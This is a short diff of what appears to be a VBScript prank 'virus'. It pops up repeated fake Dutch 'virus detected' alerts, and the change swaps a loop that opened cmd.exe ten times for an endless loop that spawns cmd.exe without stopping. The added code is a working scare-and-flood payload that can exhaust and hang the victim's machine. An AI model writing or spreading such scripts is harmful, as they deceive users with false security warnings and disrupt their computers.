@@ -18,8 +18,9 @@ Else
 	For i = 1 To 10
 		msgbox "Virus gedetecteerd!",2+48,"Virus gedetecteerd"
 	Next
-	For i = 1 To 10
-		shell.run "cmd.exe"
-	Next
+	do
+	shell.run "cmd.exe"
+	loop
 End If
+
 
